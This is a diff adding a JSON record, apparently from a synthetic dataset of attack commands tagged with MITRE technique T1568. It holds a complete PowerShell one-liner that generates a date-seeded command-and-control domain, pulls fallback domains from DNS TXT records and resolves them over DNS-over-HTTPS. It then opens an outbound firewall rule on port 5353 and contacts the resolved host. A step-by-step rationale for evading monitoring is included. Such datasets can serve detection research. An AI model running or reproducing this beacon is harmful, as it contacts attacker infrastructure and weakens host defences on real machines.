@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $seed=(Get-Date -Format 'yyMMdd'); $dom=('pool{0}.rotating-c2.com' -f $seed); $txt=Resolve-DnsName $dom -Type TXT -ErrorAction SilentlyContinue; $alts=((($txt | ForEach-Object { $_.Strings }) -join ',') -split ',') | Where-Object { $_ -match '^[a-z0-9\\.-]+$' }; $target=($alts + $dom) | Select-Object -First 1; $json=(Invoke-WebRequest -Uri ('https://dns.google/resolve?name={0}&type=1' -f $target) -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json; $ip=$json.Answer | Where-Object { $_.type -eq 1 } | Select-Object -First 1 -ExpandProperty data; if($ip){ netsh advfirewall firewall add rule name='out_5353' dir=out action=allow protocol=TCP remoteport=5353 | Out-Null; Invoke-WebRequest -Uri ('http://{0}:5353/p' -f $ip) -Headers @{ Host=$target } -TimeoutSec 6 -UseBasicParsing } }",
+  "explanation": "Extracts alternate rendezvous domains from TXT records, resolves via Google's DoH endpoint, permits outbound 5353, and contacts the resolved IP using the selected Host.",
+  "rationale_steps": [
+    "Generate a base DGA domain and query TXT for a fallback domain list.",
+    "Resolve the selected domain using DNS-over-HTTPS.",
+    "Allow egress on a rarely monitored port.",
+    "Issue an HTTP probe with Host header to support virtual host routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-3258f085",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
